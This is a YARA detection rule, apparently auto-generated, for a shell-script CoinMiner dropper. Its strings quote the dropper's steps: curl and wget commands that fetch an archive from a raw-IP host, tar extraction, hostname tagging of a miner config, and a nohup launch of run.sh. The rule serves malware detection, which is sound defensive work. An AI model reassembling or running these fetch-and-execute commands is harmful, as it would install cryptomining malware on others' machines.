rule SCRIPT_Dropper_CoinMiner_ForgeAuto_32927e23
{
    meta:
        author = "Marjoriefort"
        description = "Detects CoinMiner (script_sh, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "32927e23f0d592e6fa1eff9886b109dd5bacce84ce2a05dd6c3dc2b431f9b4ba"
        yarahub_uuid = "290d2456-1dd7-46e9-8fc9-fdaf62fd23dc"
        famille = "CoinMiner"
        famille_source = "reputation"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "medium"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "c1210089a2616bc1ef7ff3e4dceb317e"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "URL=http://23.252.123.134:18095/fleet_lin.tgz" ascii
        $s1 = "mkdir -p \"$D\" 2>/dev/null" ascii
        $s2 = "if command -v curl >/dev/null 2>&1; then" ascii
        $s3 = "-n \"$DL\" ] || { echo \"NODL $(hostname 2>/dev/null)\"; exit 1; }" ascii
        $s4 = "tar xzf f.tgz 2>/dev/null || { echo \"NOTAR $(hostname 2>/dev/null)\"; exit 1; }" ascii
        $s5 = "H=$(hostname 2>/dev/null | cut -c1-12)" ascii
        $s6 = "sed -i \"s/RIGNAME/$H/\" config.json 2>/dev/null" ascii
        $s7 = "NOTAR $(hostname 2>/dev/null)" ascii
        $s8 = "s/RIGNAME/$H/" ascii
        $s9 = "] || { echo" ascii
        $s10 = "lite_mine2.sh -" ascii
        $s11 = "M=$(uname -m 2>/dev/null)" ascii
        $s12 = "*) echo \"SKIP_ARCH $M $(hostname 2>/dev/null)\"; exit 0 ;;" ascii
        $s13 = "cd \"$D\" 2>/dev/null || exit 1" ascii
        $s14 = "timeout 240 curl -s -o f.tgz \"$URL\" 2>/dev/null || curl -s -o f.tgz \"$URL\" 2>/dev/null" ascii
        $s15 = "if [ -z \"$DL\" ] && command -v wget >/dev/null 2>&1; then" ascii
        $s16 = "timeout 240 wget -q -O f.tgz \"$URL\" 2>/dev/null || wget -q -O f.tgz \"$URL\" 2>/dev/null" ascii
        $s17 = "nohup sh run.sh >/dev/null 2>&1 &" ascii
        $s18 = "SKIP_ARCH $M $(hostname 2>/dev/null)" ascii
        $s19 = "2>/dev/null || curl -s -o f.tgz" ascii
    condition:
        true and filesize < 50MB and 2 of ($s1, $s2, $s3, $s4, $s5, $s6, $s7, $s8, $s9, $s10, $s11, $s12, $s13, $s14, $s15, $s16, $s17, $s18, $s19) and 1 of ($s0)
}
